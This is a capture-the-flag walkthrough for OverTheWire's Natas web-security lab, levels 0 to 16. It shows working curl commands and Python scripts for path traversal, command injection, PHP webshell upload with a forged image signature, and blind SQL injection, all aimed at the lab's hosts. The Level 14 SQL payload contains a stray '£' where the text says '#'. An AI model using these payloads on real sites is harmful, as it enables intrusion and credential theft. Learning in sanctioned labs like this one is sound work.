# OverTheWire - Natas

[![OverTheWire: Natas](https://img.shields.io/badge/OverTheWire-Natas-white)](https://overthewire.org/wargames/natas/)

The `Natas` wargame is a series of web security challenges. Many of the earlier challenges can be solved with the browser's built-in developer tools and command line utilities. For the challenges that can't be solved within those, I like to use `CyberChef`, `Burp Suite Community`, and `Python`. However, there are many other great tools out there that you can use, so just use what you're comfortable with.

**Connecting to Natas**

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

<details>
<summary><b>Table of Contents</b></summary>

- [Level 0](#level-0)
- [Level 1](#level-1)
- [Level 2](#level-2)
- [Level 3](#level-3)
- [Level 4](#level-4)
- [Level 5](#level-5)
- [Level 6](#level-6)
- [Level 7](#level-7)
- [Level 8](#level-8)
- [Level 9](#level-9)
- [Level 10](#level-10)
- [Level 11](#level-11)
- [Level 12](#level-12)
- [Level 13](#level-13)
- [Level 14](#level-14)
- [Level 15](#level-15)
- [Level 16](#level-16)
- [Level 17](#level-17)
- [Level 18](#level-18)
- [Level 19](#level-19)
- [Level 20](#level-20)
- [Level 21](#level-21)
- [Level 22](#level-22)
- [Level 23](#level-23)
- [Level 24](#level-24)
- [Level 25](#level-25)
- [Level 26](#level-26)
- [Level 27](#level-27)
- [Level 28](#level-28)
- [Level 29](#level-29)
- [Level 30](#level-30)
- [Level 31](#level-31)
- [Level 32](#level-32)
- [Level 33](#level-33)

</details>

## Level 0

![natas0_index.jpg](screenshots/natas/natas0_index.jpg)

The password for the next level is in the source code of the site.

```bash
curl -s http://natas0:$natas0_pass@natas0.natas.labs.overthewire.org/ | egrep -o [[:alnum:]]{32}
```

## Level 1

![natas1_index.jpg](screenshots/natas/natas1_index.jpg)

There is a script blocking right clicking on the site. However, you can still solve the challenge the same way as the last challenge. The source code also contains the password for the current level, so we can use `sed` to remove it from our results.

```bash
curl -s http://natas1:$natas1_pass@natas1.natas.labs.overthewire.org/ | sed "s/$natas1_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 2

![natas2_index.jpg](screenshots/natas/natas2_index.jpg)

When we view the source code, we see this:

![natas2_1.jpg](screenshots/natas/natas2_1.jpg)

The source code reveals a directory named `files`. If we go to the [files](http://natas2.natas.labs.overthewire.org/files/) directory, we see a file named [users.txt](http://natas2.natas.labs.overthewire.org/files/users.txt).

```bash
curl -s http://natas2:$natas2_pass@natas2.natas.labs.overthewire.org/files/users.txt | egrep -o [[:alnum:]]{32}
```

## Level 3

![natas3_index.jpg](screenshots/natas/natas3_index.jpg)

If we check the source code, we see this:

![natas3_1.jpg](screenshots/natas/natas3_1.jpg)

This is a hint to the `robots.txt` file, which then reveals a hidden directory, `s3cr3t`:

![natas3_2.jpg](screenshots/natas/natas3_2.jpg)

If we view the contents of [s3cr3t](http://natas3.natas.labs.overthewire.org/s3cr3t/), we see a file named [users.txt](http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt).

```bash
curl -s http://natas3:$natas3_pass@natas3.natas.labs.overthewire.org/s3cr3t/users.txt | egrep -o [[:alnum:]]{32}
```

## Level 4

![natas4_index.jpg](screenshots/natas/natas4_index.jpg)

When we connect to the site, we get a message saying only users from `http://natas5.natas.labs.overthewire.org/` are authorized. The way a website can tell where you're coming from is through the `Referer` header. We can set this with the `-e` or `--referer` option in `curl`.

```bash
curl -s http://natas4:$natas4_pass@natas4.natas.labs.overthewire.org/ -e http://natas5.natas.labs.overthewire.org/ | sed "s/$natas4_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 5

![natas5_index.jpg](screenshots/natas/natas5_index.jpg)

We need to figure out a way to be "logged in" on the site. If we check the response headers, we see an interesting header:

```bash
$ curl -Is http://natas5:$natas5_pass@natas5.natas.labs.overthewire.org/ | grep "Set-Cookie"
Set-Cookie: loggedin=0
```

Let's try sending a request with a cookie set to `loggedin=1`. We can do this with the `-b` or `--cookie` option in `curl`.

```bash
curl -s http://natas5:$natas5_pass@natas5.natas.labs.overthewire.org/ -b "loggedin=1" | sed "s/$natas5_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 6

![natas6_index.jpg](screenshots/natas/natas6_index.jpg)

For this challenge, we need to figure out how to get the secret. If we check the [sourcecode](http://natas6.natas.labs.overthewire.org/index-source.html), we see a `php` script:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

It looks like this script is using `include` to include a file named `secret.inc`, which is likely where the secret is being defined. Let's see what's in the file:

```bash
$ curl -s http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

If we look at the form in sourcecode, we can see how to submit our secret. We need to send a `POST` request with the parameters `secret` and `submit`:

```html
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

With this information, we can now craft a `curl` command to get the password for us.

```bash
curl -s "http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/" -X 'POST' -d "secret=$(curl -s http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/includes/secret.inc | grep -oP '\$secret = "\K[^"]+')&submit" | sed "s/$natas6_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 7

![natas7_index.jpg](screenshots/natas/natas7_index.jpg)

For this level, we are presented with a website which contains two links to `Home` and `About`. If check the source code, we can see how the pages are loaded:

![natas7_1.jpg](screenshots/natas/natas7_1.jpg)

It looks like it's loading the page through the `index.php` script using the `page` parameter. If we look at the hint, we see the password is in the `/etc/natas_webpass/natas8` file. Let's try requesting that by replacing the value in the `page` parameter.

```bash
curl -s "http://natas7:$natas7_pass@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" | sed "s/$natas7_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 8

![natas8_index.jpg](screenshots/natas/natas8_index.jpg)

Let's check the [sourcecode](http://natas8.natas.labs.overthewire.org/index-source.html):

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Here we can see a variable, `encodedSecret`, and a function, `encodeSecret`, being declared. Looks like all we need to do is reverse the `encodeSecret` function so our input matches the `encodedSecret`.

```bash
curl -s "http://natas8:$natas8_pass@natas8.natas.labs.overthewire.org/" -X 'POST' -d "secret=$(curl -s "http://natas8:$natas8_pass@natas8.natas.labs.overthewire.org/index-source.html" | grep -oP '\$encodedSecret&nbsp;=&nbsp;"\K[^"]+' | xxd -p -r | rev | base64 -d)&submit" | sed "s/$natas8_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 9

![natas9_index.jpg](screenshots/natas/natas9_index.jpg)

Here's the [sourcecode](http://natas9.natas.labs.overthewire.org/index-source.html):

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

This page uses the `passthru` command to send our input to the server using the `needle` parameter. Luckily for us, there is no input sanitization so we can enter whatever we want and the server will execute it for us. All we need to do is ensure it can be properly executed with the `grep -i` command.

```bash
curl -s "http://natas9:$natas9_pass@natas9.natas.labs.overthewire.org/" --data-urlencode "needle=. /etc/natas_webpass/natas10;" | sed "s/$natas9_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 10

![natas10_index.jpg](screenshots/natas/natas10_index.jpg)

[Sourcecode](http://natas10.natas.labs.overthewire.org/index-source.html):

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This challenge is similar to the last level except the characters `;`, `|`, and `&` aren't allowed. Luckily for us, `grep` actually lets us search multiple files by just separating the filenames with a space. We didn't actually need the `;` to solve the last level but I added it so it would only print out the password.

We *could* use `needle=. /etc/natas_webpass/natas11`, but `needle=-he "[[:alnum:]]\{32\}" /etc/natas_webpass/natas11` also works and only returns the password.

```bash
curl -s "http://natas10:$natas10_pass@natas10.natas.labs.overthewire.org/" --data-urlencode 'needle=-he "[[:alnum:]]\{32\}" /etc/natas_webpass/natas11' | sed "s/$natas10_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 11

![natas11_index.jpg](screenshots/natas/natas11_index.jpg)

Alright... So there's quite a bit going on in the [sourcecode](http://natas11.natas.labs.overthewire.org/index-source.html). Let's take it one step at a time. The first step is to identify our goal, which is to get it to print the password, and how to achieve it.

```php
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```

Ok, so all we have to do is get the `showpassword` parameter to equal `yes`. Well whats stopping us from just entering `showpassword=yes`? It's because of this line right here:

```php
$data = loadData($defaultdata);
```

This line is running the `loadData` function on `data` which is modifying our `data` somehow. Let's take a look at what it's doing:

```php
function loadData($def) {
    // Get cookies
    global $_COOKIE;
    $mydata = $def;
    // Check for data in cookies
    if(array_key_exists("data", $_COOKIE)) {
    // Decrypt data
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    // Make sure array is valid
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        // Make sure bgcolor is a valid color
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}
```

So the only line that really matters is this:

```php
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
```

It's taking our cookie value and encrypting it with `xor_encrypt`, which is a standard repeating key XOR function. If you're unfamiliar with XOR, you can read up on it [here](https://en.wikipedia.org/wiki/XOR_cipher).

Basically, things encrypted with XOR shares these properties:

```
a ^ b = c
a ^ c = b
b ^ c = a
```

In terms of encryption, the `a`, `b`, and `c` would be the `plaintext`, `key`, and `ciphertext`. In our case, `plaintext` is the decrypted cookie, `key` is the value used in the `xor_encrypt` function, and `ciphertext` is the base64 decoded cookie. This means we need two out of three of the variables in order to recover the third.

You might not have realized it, but we have enough to recover the key right now. Of course we know what the `ciphertext` is, but how do we know the `plaintext`? It's because we know what the decrypted data *should* look like due to these two lines:

```php
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata))
```

This tells us the decrypted is a json array with the keys `showpassword` and `bgcolor`. We already know what the `bgcolor` is set to because it's given to us, and we can assume `showpassword` is currently set to `no` since we're supposed to change it to `yes`. This means the decrypted data should look something like this:

```json
{"showpassword": "no", "bgcolor": "#ffffff"}
```

We can throw this into [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'UTF8','string':'%7B%22showpassword%22:%22no%22,%22bgcolor%22:%22%23ffffff%22%7D'%7D,'Standard',false)&input=Q2xWTEloNEFTQ3NDQkU4bEF4TWFjRk1aVjJoZFZWb3RFaGhVSlFOVkFtaFNFVjRzRnhGZWFBdyUzRA) to verify for us.

Now we just have to create a new array where `showpassword` is `yes` and encrypt it with the key. We can use [CyberChef](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'qw8J'%7D,'Standard',false)To_Base64('A-Za-z0-9%2B/%3D')&input=eyJzaG93cGFzc3dvcmQiOiJ5ZXMiLCJiZ2NvbG9yIjoiI2ZmZmZmZiJ9) for that as well. This gives us our new cookie value, `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`.

```bash
curl -s "http://natas11:$natas11_pass@natas11.natas.labs.overthewire.org/" -b "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK" | sed "s/$natas11_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 12

![natas12_index.jpg](screenshots/natas/natas12_index.jpg)

[Sourcecode](http://natas12.natas.labs.overthewire.org/index-source.html):

```php
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
```

Doesn't seem like anything special is going on here. All it's doing is generating a random filename and directory for our uploaded file and giving it a `.jpg` extension. Now we just have to figure out how to upload something that will help us get the password.

We can try uploading a simple `php` script to read the flag:

```php
<?php readfile("test.txt");?>
```

The only problem is it gets renamed to a `jpg` when we upload it through the form, which will prevent our script from being executed. However, since the renaming is done on the client side, we can just send our own request without modifying the extension.

First, we need to figure out how to upload the file:

```bash
echo '<?php readfile("/etc/natas_webpass/natas13");?>' |\
curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/"\
 -X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" |\
grep -oP 'href="\Kupload/[[:alnum:]]{10}.php'
```

Then we get the results of the file we just uploaded:

```bash
curl "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/$(echo -n '<?php readfile("/etc/natas_webpass/natas13");?>' | curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')"
```

## Level 13

![natas13_index.jpg](screenshots/natas/natas13_index.jpg)

[Sourcecode](http://natas13.natas.labs.overthewire.org/index-source.html):

```php
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

This level is essentially the same as the last level except for one line:

```php
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
```

Before the file can be uploaded, it needs to pass the [exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) test. As long as the file signature matches any one of the listed image types, the file will be uploaded. We can use [this site](https://www.filesignatures.net/index.php?page=search) to look up valid file signatures. The go-tos are `BM` (`.bmp`) and `GIF8` (`.gif`) since they're both common file types, easy to remember, and their signatures are all ascii so they're easy to add.

**Note:** The characters from the file signature will also show up in the results, so remember to ignore them.

```bash
curl -s "http://natas13:$natas13_pass@natas13.natas.labs.overthewire.org/$(echo -n 'BM<?php readfile("/etc/natas_webpass/natas14");?>' | curl -s "http://natas13:$natas13_pass@natas13.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas13.php" -F "uploadedfile=@-;filename=natas13.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')" | egrep -o [[:alnum:]]{32}$
```

## Level 14

![natas14_index.jpg](screenshots/natas/natas14_index.jpg)

[Sourcecode](http://natas14.natas.labs.overthewire.org/index-source.html):

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
```

This level is a basic SQL injection. All we need to do is insert a statement that completes this query:

```sql
SELECT * from users where username="<username_input>" and password="<password_input>"
```

As long as this query returns at least 1 row, the login will be successful. We also see that the database is using `mysql`. We can do a vanilla SQLi with `" or 1=1#` in the `username` parameter. In `mysql`, the `#` acts as a comment and ignores the rest of the query, which essentially turns our query into this:

```sql
SELECT * from users where username="" or 1=1
```

Now to send our SQLi:

```bash
curl -s "http://natas14:$natas14_pass@natas14.natas.labs.overthewire.org/" -X 'POST' -d 'username=" or 1=1£&password=' | sed "s/$natas14_pass//g" | egrep -o [[:alnum:]]{32}
```

## Level 15

![natas15_index.jpg](screenshots/natas/natas15_index.jpg)

[Sourcecode](http://natas15.natas.labs.overthewire.org/index-source.html):

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
```

This is another SQLi challenge except this time, it doesn't return any results. Instead, it only tells us whether a user exists or not. This is called a `blind SQL injection`. To perform a blind SQLi, we will conduct a series of *true* or *false* queries. If the site responds with `This user exists.`, we know that our input was correct. This allows us to brute force the password one character at a time.

We can do this with the [LIKE](https://dev.mysql.com/doc/refman/8.0/en/string-comparison-functions.html#operator_like) function which allows us to compare strings. Unfortunately, MySQL's string comparision is case-insensitive by default. We can get around this by using the [BINARY](https://dev.mysql.com/doc/refman/8.0/en/binary-varbinary.html) data type. This makes MySQL compare the byte value rather than the string.

We're going to be using `Python` for this challenge since we need to perform a lot of queries. Here is a [simple script](files/natas/natas15.py) to solve this challenge. However, it takes forever to run since it runs each query one at a time, so I rewrote it with `asyncio` to find every character at the same time. The [new and improved script](files/natas/natas15_async.py) finishes running in several seconds as opposed to minutes.

```python
#!/usr/bin/env python3
import requests


url = 'http://natas15.natas.labs.overthewire.org/index.php?username='
auth = ('natas15', natas15_pass)

def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        sqli = f'natas16" and password like binary "%{char}%'
        r = requests.get(url+sqli, auth=auth)
        if 'This user exists.' in r.text:
            charset += char
    return charset

def get_password(charset):
    password = ''
    while True:
        for char in charset:
            sqli = f'natas16" and password like binary "{password+char}%'
            r = requests.get(url+sqli, auth=auth)
            if 'This user exists.' in r.text:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    charset = get_charset()
    password = get_password(charset)
    print(password)
```

## Level 16

![natas16_index.jpg](screenshots/natas/natas16_index.jpg)

[Sourcecode](http://natas16.natas.labs.overthewire.org/index-source.html):

```php
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>
```

Looks like we have another `grep` challenge. This time, there are a ton of extra characters that aren't allowed in our query. Our input is also wrapped with double quotes to prevent us from grepping multiple files like we did before. This is actually a blessing in disguise because in Linux, the shell will still interpret special characters on strings wrapped with double quotes.

Despite being able to use special characters, we still can't get around the fact that our query is quoted. Anything we send will end up being grepped in `dictionary.txt`. Sounds like another blind injection attack to me. Now we just need to craft a *true* or *false* query that will help us find the password.

We can solve this challenge with command substitution and a nested `grep` command. By using command substitution, we can enumerate the `/etc/natas_webpass/natas17` file with something like this:

```bash
$(grep ^<injection> /etc/natas_webpass/natas17)
```

This will expand to the password, which will make the outer `grep` to search for the password in `dictionary.txt`. We also need to set a default word to look for to indicate wrong answers. Pick any word in the wordlist that is easily identifiable (i.e. does not conflict with any text in the source code).

```bash
$(grep ^<injection> /etc/natas_webpass/natas17)password
```

We can reuse the code from the last challenge to get [this (without asyncio)](files/natas/natas16.py) and [this (with asyncio)](files/natas/natas16_async.py):

```python
#!/usr/bin/env python3
import requests


url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password&submit'
auth = ('natas16', natas16_pass)

def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        search = f'$(grep {char} /etc/natas_webpass/natas17)'
        r = requests.get(url.format(search), auth=auth)
        if 'password' not in r.text:
            charset += char
    return charset

def get_password(charset):
    password = ''
    while True:
        for char in charset:
            search = f'$(grep ^{password+char} /etc/natas_webpass/natas17)'
            r = requests.get(url.format(search), auth=auth)
            if 'password' not in r.text:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    charset = get_charset()
    password = get_password(charset)
    print(password)
```
